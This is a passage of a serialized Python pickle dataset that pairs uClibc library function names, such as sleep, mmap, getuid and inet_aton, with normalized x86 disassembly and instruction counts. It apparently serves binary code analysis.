XOR~EDX,EDX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EDI,EBX\nMOV~AL,[EBX]\nLEA~ECX,[EAX-0]\nCMP~CL,0\nJBE~FOO\nOR~EAX,0\nMOV~CL,0\nCMP~AL,0\nJBE~FOO\nLEA~ECX,[EAX-0]\nMOVZX~EAX,CL\nCMP~EAX,ESI\nJGE~FOO\nINC~EBX\nCMP~EDX,[ESP+0]\nJA~FOO\nJNZ~FOO\nCMP~CL,[ESP+0]\nJBE~FOO\nMOV~AL,[ESP+0]\nAND~EBP,EAX\nCALL~FOO\nOR~EDX,0\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nIMUL~EDX,ESI\nMOVZX~EAX,CL\nADD~EDX,EAX\nJMP~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX],EDI\nMOV~EAX,EBP\nCMP~AL,0\nSBB~EBX,EBX\nSUB~EBX,0\nCMP~[ESP+0],0\nJZ~FOO\nCMP~EDX,EBX\nJBE~FOO\nCALL~FOO\nMOV~EDX,EBX\nMOV~DWORDPTR[EAX],0\nMOV~EAX,EBP\nTEST~AL,AL\nJZ~FOO\nNEG~EDX\nADD~ESP,0\nMOV~EAX,EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p365
L277L
tp366
a(S'exit'
p367
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nPUSH~0\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~EAX\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO"'
p368
L103L
tp369
a(S'sleep'
p370
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nTEST~EDX,EDX\nJNZ~FOO\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],EDX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nJMP~FOO\nMOV~[ESP+EDX*4+0],0\nDEC~EDX\nJNS~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~EBP\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nOR~EAX,0\nADD~ESP,0\nMOV~[EBX],ESI\nJMP~FOO\nCMP~[ESP+0],0\nLEA~EBP,[ESP+0]\nLEA~EBX,[ESP+0]\nJNZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~EBX\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nMOV~[EBX],ESI\nJMP~FOO\nPUSH~ESI\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nPUSH~EBX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nTEST~EDI,EDI\nJZ~FOO\nXOR~EAX,EAX\nCMP~[ESP+0],0\nSETNLE~AL\nADD~EAX,[ESP+0]\nJMP~FOO\nXOR~EAX,EAX\nJMP~FOO\nOR~EAX,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p371
L393L
tp372
a(S'sysconf'
p373
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nJA~FOO\nJMP~<STR>\nMOV~EAX,0\nJMP~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nOR~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nADD~ESP,0\nRETN"'
p374
L325L
tp375
a(S'__uClibc_fini'
p376
S'"PUSH~EBX\nMOV~EBX,0\nSUB~EBX,0\nSUB~ESP,0\nSAR~EBX,0\nJMP~FOO\nCALL~<STR>\nDEC~EBX\nCMP~EBX,0\nJNZ~FOO\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nCALL~EAX\nMOV~ECX,<STR>\nTEST~ECX,ECX\nJZ~FOO\nPOP~EBX\nPOP~EAX\nPOP~EBX\nJMP~ECX\nPOP~EAX\nPOP~EDX\nPOP~EBX\nRETN"'
p377
L63L
tp378
a(S'__check_one_fd'
p379
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,EAX\nMOV~EBX,EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,ESI\nJZ~FOO\nCALL~FOO\nPOP~EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p380
L52L
tp381
a(S'__uClibc_init'
p382
S'"SUB~ESP,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~EAX,0\nMOV~<STR>,0\nMOV~<STR>,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nADD~ESP,0\nJMP~FOO\nADD~ESP,0\nRETN"'
p383
L64L
tp384
a(S'__uClibc_main'
p385
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~<STR>,EAX\nMOV~EAX,[ESP+0]\nMOV~<STR>,EAX\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nLEA~EDX,[EDI+EAX*4]\nLEA~EAX,[EDX+0]\nMOV~<STR>,EAX\nCMP~EAX,[EDI]\nJNZ~FOO\nMOV~<STR>,EDX\nPUSH~ECX\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nCMP~DWORDPTR[EAX],0\nLEA~EAX,[EAX+0]\nJNZ~FOO\nMOV~EBX,EAX\nJMP~FOO\nMOV~EAX,[EBX]\nCMP~EAX,0\nJA~FOO\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nLEA~EAX,[ESP+EAX*8+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~EBX,0\nCMP~DWORDPTR[EBX],0\nJNZ~FOO\nLEA~EAX,[ESP+0]\nCALL~FOO\nCALL~FOO\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJNZ~FOO\nMOV~AX,0\nMOV~<STR>,EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nCMP~EBX,EAX\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nCMP~EBX,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,[ESP+0]\nJNZ~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJZ~FOO\nMOV~EDX,0\nXOR~EAX,EAX\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ESI,0\nMOV~EAX,[EDI]\nSUB~ESI,0\nMOV~<STR>,EAX\nSAR~ESI,0\nMOV~EAX,[ESP+0]\nXOR~EBX,EBX\nMOV~<STR>,EAX\nJMP~FOO\nCALL~<STR>\nINC~EBX\nCMP~EBX,ESI\nJB~FOO\nTEST~EBP,EBP\nJZ~FOO\nCALL~EBP\nMOV~ESI,0\nXOR~EBX,EBX\nSUB~ESI,0\nSAR~ESI,0\nJMP~FOO\nCALL~<STR>\nINC~EBX\nCMP~EBX,ESI\nJB~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~<STR>\nPUSH~EDI\nPUSH~[ESP+0]\nCALL~[ESP+0]\nMOV~[ESP],EAX\nCALL~FOO"'
p386
L441L
tp387
a(S'sigaction'
p388
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBX]\nMOV~[ESP+0],EAX\nLEA~EAX,[EBX+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[EBX+0]\nOR~EAX,0\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~EAX,0\nTEST~[EBX+0],0\nJNZ~FOO\nMOV~EAX,0\nMOV~[ESP+0],EAX\nXOR~EDX,EDX\nTEST~ESI,ESI\nJZ~FOO\nLEA~EDX,[ESP+0]\nXOR~EAX,EAX\nTEST~EBX,EBX\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~0\nPUSH~EDX\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~ESI,ESI\nJZ~FOO\nTEST~EAX,EAX\nJS~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESI],EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[ESI+0],EAX\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p389
L217L
tp390
a(S'mmap'
p391
S'"MOV~EDX,EBX\nMOV~EAX,0\nLEA~EBX,[ESP+0]\nINT~0\nMOV~EBX,EDX\nCMP~EAX,0\nJA~FOO\nRETN"'
p392
L27L
tp393
a(S'__socketcall'
p394
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p395
L50L
tp396
a(S'__syscall_rt_sigaction'
p397
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p398
L59L
tp399
a(S'_exit'
p400
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0"'
p401
L19L
tp402
a(S'clock_getres'
p403
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p404
L50L
tp405
a(S'fstat'
p406
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nLEA~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nJMP~FOO\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nRETN"'
p407
L72L
tp408
a(S'__getdents'
p409
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nPUSH~EDX\nPUSH~[ESP+0]\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJLE~FOO\nLEA~EDI,[EBX+EAX]\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[EBX+0],AX\nMOV~AL,[EBX+0]\nMOV~[EBX+0],AL\nPUSH~EAX\nMOVZX~EAX,[EBX+0]\nSUB~EAX,0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOVZX~EAX,[EBX+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~EBX\nCALL~FOO\nMOVZX~EAX,[EBX+0]\nADD~ESP,0\nADD~EBX,EAX\nCMP~EBX,EDI\nJB~FOO\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p410
L111L
tp411
a(S'__getdents64'
p412
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[EBP+0]\nMOV~EDI,[EBP+0]\nADD~EAX,0\nMOV~EDX,[EBP+0]\nAND~EAX,0\nSUB~ESP,EAX\nLEA~EAX,[ESP+0]\nAND~EAX,0\nMOV~[EBP-0],EAX\nMOV~ECX,EAX\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~[EBP-0],EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~[EBP-0]\nMOV~EDX,[EBP-0]\nMOV~[EAX],EDX\nJMP~FOO\nCMP~[EBP-0],0\nJZ~FOO\nMOV~ESI,[EBP+0]\nMOV~EBX,[EBP-0]\nMOV~[EBP-0],0\nMOV~[EBP-0],0\nJMP~FOO\nMOVZX~EAX,[EBX+0]\nLEA~ECX,[EAX+0]\nMOV~EAX,[EBP+0]\nAND~ECX,0\nADD~EAX,[EBP+0]\nLEA~EDI,[ESI+ECX]\nMOV~[EBP-0],EDI\nCMP~EDI,EAX\nJBE~FOO\nPUSH~0\nPUSH~[EBP-0]\nPUSH~[EBP-0]\nPUSH~[EBP+0]\nCALL~FOO\nADD~ESP,0\nCMP~ESI,[EBP+0]\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,[EBX+0]\nMOV~[EBP-0],EDX\nMOV~[EBP-0],EAX\nMOV~EAX,[EBX]\nMOV~EDX,[EBX+0]\nMOV~[ESI+0],EDX\nMOV~[ESI],EAX\nMOV~EAX,[EBX+0]\nMOV~EDX,[EBX+0]\nMOV~[ESI+0],EDX\nMOV~[ESI+0],EAX\nMOV~[ESI+0],CX\nMOV~AL,[EBX+0]\nMOV~[ESI+0],AL\nPUSH~EAX\nMOVZX~EAX,[EBX+0]\nSUB~EAX,0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EAX,[EBX+0]\nMOV~ESI,[EBP-0]\nADD~EBX,EAX\nADD~ESP,0\nMOV~EAX,[EBP-0]\nADD~EAX,[EBP-0]\nCMP~EBX,EAX\nJB~FOO\nMOV~EAX,ESI\nSUB~EAX,[EBP+0]\nLEA~ESP,[EBP-0]\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p413
L276L
tp414
a(S'getdtablesize'
p415
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,0\nTEST~EAX,EAX\nJS~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,EDX\nADD~ESP,0\nRETN"'
p416
L37L
tp417
a(S'getegid'
p418
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p419
L38L
tp420
a(S'geteuid'
p421
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p422
L38L
tp423
a(S'getgid'
p424
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p425
L38L
tp426
a(S'getpagesize'
p427
S'"MOV~EAX,<STR>\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,EAX\nMOV~EAX,EDX\nRETN"'
p428
L19L
tp429
a(S'getrlimit'
p430
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p431
L50L
tp432
a(S'getuid'
p433
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p434
L38L
tp435
a(S'lseek64'
p436
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ECX,EBX\nMOV~EDI,[ESP+0]\nMOV~EBX,ECX\nLEA~ESI,[ESP+0]\nSAR~EBX,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nJMP~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,ESI\nCDQ~,\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p437
L95L
tp438
a(S'mremap'
p439
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p440
L63L
tp441
a(S'munmap'
p442
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p443
L50L
tp444
a(S'nanosleep'
p445
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p446
L50L
tp447
a(S'sbrk'
p448
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nCMP~<STR>,0\nMOV~ESI,[ESP+0]\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nTEST~ESI,ESI\nMOV~EAX,<STR>\nJNZ~FOO\nMOV~EBX,EAX\nJMP~FOO\nSUB~ESP,0\nMOV~EBX,EAX\nLEA~EAX,[EAX+ESI]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nRETN"'
p449
L78L
tp450
a(S'times'
p451
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p452
L46L
tp453
a(S'__xstat_conv'
p454
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOVZX~EAX,WORDPTR[ESI]\nMOV~[EBX+0],0\nMOV~[EBX],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p455
L125L
tp456
a(S'memcpy'
p457
S'"PUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~ECX,EAX\nMOV~EDI,[ESP+0]\nSHR~ECX,0\nMOVSD~,\nTEST~AL,0\nJZ~FOO\nMOVSW~,\nTEST~AL,0\nJZ~FOO\nMOVSB~,\nMOV~EAX,[ESP+0]\nPOP~ESI\nPOP~EDI\nRETN"'
p458
L39L
tp459
a(S'inet_aton'
p460
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nXOR~ESI,ESI\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nMOVSX~EAX,BYTEPTR[ECX]\nMOV~EBP,<STR>\nTEST~[EBP+EAX*2+0],0\nJZ~FOO\nXOR~EDI,EDI\nJMP~FOO\nIMUL~EAX,EDI,0\nLEA~EDI,[EAX+EBX-0]\nCMP~EDI,0\nJG~FOO\nINC~ECX\nMOV~DL,[ECX]\nMOVSX~EBX,DL\nMOVZX~EAX,[EBP+EBX*2+0]\nTEST~AL,0\nJNZ~FOO\nCMP~DWORDPTR[ESP],0\nJG~FOO\nCMP~DL,0\nJNZ~FOO\nINC~ECX\nJMP~FOO\nINC~ECX\nTEST~DL,DL\nJZ~FOO\nTEST~AL,0\nJZ~FOO\nSHL~ESI,0\nINC~DWORDPTR[ESP]\nOR~ESI,EDI\nCMP~DWORDPTR[ESP],0\nJLE~FOO\nMOV~EAX,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nBSWAP~ESI\nMOV~[EAX],ESI\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p461
L148L
tp462
a(S'_dl_aux_init'
p463
S'"MOV~EDX,[EAX+0]\nMOV~<STR>,EDX\nMOV~EAX,[EAX+0]\nMOV~<STR>,EAX\nRETN"'
p464
L18L
tp465
a(S'brk'
p466
S'"PUSH~EBX\nMOV~EDX,0\nSUB~ESP,0\nMOV~EAX,EDX\nMOV~EBX,[ESP+0]\nMOV~ECX,EBX\nMOV~EBX,EBX\nINT~0\nMOV~EBX,ECX\nXOR~ECX,ECX\nMOV~<STR>,EAX\nCMP~EAX,EBX\nJNB~FOO\nCALL~FOO\nOR~ECX,0\nMOV~DWORDPTR[EAX],0\nMOV~EAX,ECX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p467
L54L
tp468
a(S'__syscall_error'
p469
S'"SUB~ESP,0\nMOV~EDX,EAX\nNEG~EDX\nCALL~FOO\nMOV~[EAX],EDX\nOR~EAX,0\nADD~ESP,0\nRETN"'
p470
L21L
tp471
a(S'__do_global_ctors_aux'
p472
